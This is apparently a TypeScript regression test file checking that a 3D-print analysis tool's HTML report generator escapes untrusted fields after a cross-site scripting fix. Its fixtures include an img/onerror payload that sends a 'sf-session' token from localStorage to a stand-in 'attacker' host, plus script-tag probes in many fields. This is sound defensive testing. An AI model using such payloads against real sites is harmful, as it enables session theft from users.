/**
 * report-escaping.test.ts
 * ------------------------
 * Issue #281: `generateHtmlReport()` interpolated untrusted strings from the
 * attacker-controlled `result` object (and `fileName`/`printSettings`/
 * `timestamp`) straight into the HTML page with zero escaping. Every string
 * field pulled from the request now goes through the `esc` helper in
 * report.ts before it reaches the template.
 *
 * These tests post hostile payloads at each known injection point and assert
 * the raw HTML/script payload never appears verbatim in the output, while the
 * HTML-escaped form does.
 */

import { describe, it, expect } from "vitest";
import { generateHtmlReport } from "../../report.js";
import type { AnalysisResult } from "../../analysis.js";

const PRINT_SETTINGS = {
  materialId: "pla", infillPct: 20, wallCount: 3,
  pattern: "gyroid", orientation: "flat", layerHeightMm: 0.2,
};

/** Minimal but structurally valid AnalysisResult stub, following the pattern
 *  established in report.test.ts — only the fields generateHtmlReport() reads
 *  are populated meaningfully. */
function baseResult(overrides: Record<string, unknown> = {}): AnalysisResult {
  return {
    materialModel: { twoRegion: false },
    maxVonMisesMPa: 12.5,
    maxDisplacementMm: 0.42,
    effectiveYieldMPa: 45,
    safetyFactor: 2.4,
    estimatedFailForce: 480,
    verdict: "Safe under applied load",
    failureModes: [],
    holeClassifications: [],
    fatigue: { estimatedCycles: null, fatigueConcern: false, fatigueSF: 3.1, enduranceLimitMPa: 22, confidence: "medium" },
    singularity: null,
    topologySuggestions: [],
    calibrationId: null,
    converged: true,
    meshFallback: false,
    rigidBodyMode: null,
    sfCriterion: "fdm-interface",
    safetyfactorLow: null,
    safetyFactorHigh: null,
    isotropicComparison: null,
    nodesPerElem: 10,
    ...overrides,
  } as unknown as AnalysisResult;
}

function render(
  overrides: Record<string, unknown> = {},
  fileName = "bracket.step",
  printSettings: Record<string, unknown> = PRINT_SETTINGS,
  timestamp = "2026-07-29T00:00:00Z",
) {
  return generateHtmlReport(baseResult(overrides), fileName, printSettings as typeof PRINT_SETTINGS, timestamp);
}

// The classic img/onerror payload from issue #281's realistic vector.
const HOSTILE_FILENAME = `'><img src=x onerror="fetch('http://attacker/'+localStorage.getItem('sf-session'))">`;
const ESCAPED_HOSTILE_FILENAME =
  "&#39;&gt;&lt;img src=x onerror=&quot;fetch(&#39;http://attacker/&#39;+localStorage.getItem(&#39;sf-session&#39;))&quot;&gt;";

const HOSTILE_SCRIPT = `<script>alert(1)</script>`;
const ESCAPED_SCRIPT = "&lt;script&gt;alert(1)&lt;/script&gt;";

describe("generateHtmlReport — HTML escaping (issue #281)", () => {
  it("escapes a hostile fileName in both the <title> and the header byline", () => {
    const html = render({}, HOSTILE_FILENAME);
    expect(html).not.toContain(HOSTILE_FILENAME);
    expect(html).not.toMatch(/<img src=x onerror=/);
    // Appears twice: <title> (report.ts:~189) and the header <b> (report.ts:~232).
    const occurrences = html.split(ESCAPED_HOSTILE_FILENAME).length - 1;
    expect(occurrences).toBeGreaterThanOrEqual(2);
  });

  it("escapes a hostile verdict containing a <script> tag", () => {
    const html = render({ verdict: `Safe ${HOSTILE_SCRIPT}` });
    expect(html).not.toContain(HOSTILE_SCRIPT);
    expect(html).not.toMatch(/<script>alert\(1\)<\/script>/);
    expect(html).toContain(ESCAPED_SCRIPT);
  });

  it("escapes a hostile timestamp", () => {
    const html = render({}, "bracket.step", PRINT_SETTINGS, `2026<script>alert(2)</script>`);
    expect(html).not.toMatch(/<script>alert\(2\)<\/script>/);
    expect(html).toContain("&lt;script&gt;alert(2)&lt;/script&gt;");
  });

  it("escapes failure-mode mode name and note text", () => {
    const html = render({
      failureModes: [{
        mode: `Bending${HOSTILE_SCRIPT}`, sf: 1.2, failForceN: 100,
        checked: true, confidence: "high", note: `Note${HOSTILE_SCRIPT}.`,
      }],
    });
    expect(html).not.toMatch(/<script>alert\(1\)<\/script>/);
    expect(html.match(/&lt;script&gt;alert\(1\)&lt;\/script&gt;/g)?.length).toBeGreaterThanOrEqual(2);
  });

  it("escapes failure-mode confidence text rendered by the confidence badge", () => {
    const html = render({
      failureModes: [{
        mode: "Bending", sf: 1.2, failForceN: 100, checked: true,
        confidence: HOSTILE_SCRIPT, note: "fine.",
      }],
    });
    expect(html).not.toMatch(/<script>alert\(1\)<\/script>/i);
    // Uppercased before escaping, so the tag name itself is upper-cased too.
    expect(html.toUpperCase()).toContain(ESCAPED_SCRIPT.toUpperCase());
  });

  it("escapes hole classification bolt label, type, and warning text", () => {
    const html = render({
      holeClassifications: [{
        type: `through${HOSTILE_SCRIPT}`,
        bolt: { label: `M5${HOSTILE_SCRIPT}` },
        detectedDiamMm: 5, warning: `Oversized${HOSTILE_SCRIPT}`,
      }],
    });
    expect(html).not.toMatch(/<script>alert\(1\)<\/script>/);
    expect(html.match(/&lt;script&gt;alert\(1\)&lt;\/script&gt;/g)?.length).toBeGreaterThanOrEqual(3);
  });

  it("escapes topology-suggestion text", () => {
    const html = render({
      topologySuggestions: [{
        position: [1, 2, 3], label: "hot spot", stressMPa: 40,
        suggestion: `Add a fillet${HOSTILE_SCRIPT}`,
      }],
    });
    expect(html).not.toMatch(/<script>alert\(1\)<\/script>/);
    expect(html).toContain(ESCAPED_SCRIPT);
  });

  it("escapes singularity confidence and message text", () => {
    const html = render({
      singularity: {
        detected: true, cause: "geometry", confidence: HOSTILE_SCRIPT,
        message: `Sharp corner${HOSTILE_SCRIPT}`, concentrationRatio: 5,
        peakLocation: [0, 0, 0],
      },
    });
    expect(html).not.toMatch(/<script>alert\(1\)<\/script>/);
    expect(html.match(/&lt;script&gt;alert\(1\)&lt;\/script&gt;/g)?.length).toBeGreaterThanOrEqual(2);
  });

  it("escapes rigidBodyMode.message surfaced in the reliability caveat", () => {
    const html = render({
      converged: false,
      rigidBodyMode: { detected: true, message: `Unresisted rotation${HOSTILE_SCRIPT}` },
    });
    expect(html).not.toMatch(/<script>alert\(1\)<\/script>/);
    expect(html).toContain(ESCAPED_SCRIPT);
  });

  it("escapes materialModel.degraded text", () => {
    const html = render({
      materialModel: { twoRegion: true, degraded: `Wall band collapsed${HOSTILE_SCRIPT}` },
    });
    expect(html).not.toMatch(/<script>alert\(1\)<\/script>/);
    expect(html).toContain(ESCAPED_SCRIPT);
  });

  it("still renders the mesh-fallback caveat's legitimate literal <b> markup unescaped", () => {
    // Regression guard: the mesh-fallback caveat body is fully author-written
    // (not attacker data) and deliberately contains a literal <b> tag. It must
    // NOT be escaped as a side effect of fixing the attacker-data paths.
    const html = render({ meshFallback: true, safetyFactor: null });
    expect(html).toContain("<b>not modelled</b>");
  });

  it("escapes printSettings string fields (material id, pattern, orientation)", () => {
    const html = render({}, "bracket.step", {
      materialId: `pla${HOSTILE_SCRIPT}`, infillPct: 20, wallCount: 3,
      pattern: `gyroid${HOSTILE_SCRIPT}`, orientation: `flat${HOSTILE_SCRIPT}`,
      layerHeightMm: 0.2,
    });
    expect(html).not.toMatch(/<script>alert\(1\)<\/script>/);
    expect(html.match(/&lt;script&gt;alert\(1\)&lt;\/script&gt;/gi)?.length).toBeGreaterThanOrEqual(3);
  });

  it("attribute-context sanity: the verdict color style attribute stays a fixed hex value regardless of attacker-controlled safetyFactor", () => {
    // sfColor/verdictBg are chosen from a fixed enum of hex literals by
    // ternary on safetyFactor, never interpolated from a string field, so
    // there is no attribute-injection surface here — this test locks that
    // invariant rather than exercising an escape path.
    const html = render({ safetyFactor: 0.1 });
    expect(html).toMatch(/style="color:#7a1a1a"/);
    expect(html).not.toMatch(/style="color:[^#][^"]*"/);
  });
});
